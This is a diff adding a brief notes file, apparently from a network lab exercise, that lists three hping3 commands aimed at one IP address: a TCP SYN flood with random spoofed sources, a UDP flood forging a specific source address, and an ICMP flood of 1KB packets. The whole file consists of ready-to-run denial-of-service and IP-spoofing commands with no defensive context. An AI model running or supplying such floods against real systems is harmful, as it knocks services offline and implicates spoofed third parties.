@@ -1,0 +1,6 @@
+1) 10,000 TCP packets all at once from random source IP Addresses :
+root@lamp-ubuntu-s-1vcpu-1gb-tor1-01:/var/www/html# sudo hping3 -c 10000 -d 120 -S -w 64 -p 30 --flood --rand-source --flood 178.128.232.201 
+2) 9,000 UDP packets in a span of 90 seconds from a spoofed source address:
+hping3 178.128.232.201 -2 -a 142.251.33.100 -c 9000 -i u1000
+3) 11,000 ICMP packets with a data size of 1KB at an interval of 75 packets per second:
+hping3 178.128.232.201 -1 -c 11000 -d 1024 -i u13333
